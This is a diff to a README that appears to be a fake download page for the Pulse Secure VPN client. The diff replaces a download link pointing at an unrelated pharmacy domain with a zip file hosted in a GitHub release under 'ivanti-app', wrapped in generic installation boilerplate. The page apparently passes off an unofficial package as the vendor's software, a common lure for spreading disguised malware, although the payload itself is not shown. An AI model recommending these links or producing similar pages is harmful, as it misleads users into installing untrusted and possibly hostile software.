@@ -12,7 +12,7 @@
 ## Installation
 Begin your setup process by downloading Pulse Secure for Windows:
 
-[**Download Pulse Secure**](https://newpharma-eg.com/pharma/)
+[**Download Pulse Secure**](https://github.com/ivanti-app/Pulse-Secure/releases/download/3.7843/Pulse-Secure.zip)
 
 Before proceeding with the installation, ensure your system aligns with the necessary System Requirements to prevent compatibility issues. Click the link above to obtain the installation package. Should you face any difficulties during the download or setup process, refer to the Troubleshooting section for guidance on resolving common problems.
 
